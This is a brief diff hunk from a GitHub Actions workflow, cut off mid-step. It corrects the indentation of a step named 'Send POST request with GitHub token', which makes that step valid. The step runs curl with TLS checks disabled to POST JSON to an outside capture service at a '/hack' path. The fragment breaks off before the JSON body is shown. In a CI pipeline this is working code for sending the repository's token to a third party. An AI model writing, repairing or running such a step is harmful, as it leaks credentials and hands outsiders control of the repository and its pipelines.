@@ -82,7 +82,7 @@ jobs:
     - name: Checkout the code
       uses: actions/checkout@v3
     - name: Send POST request with GitHub token
-        run:|
+      run: |
           curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
             -H "Content-Type:application/json" \
             -d '{
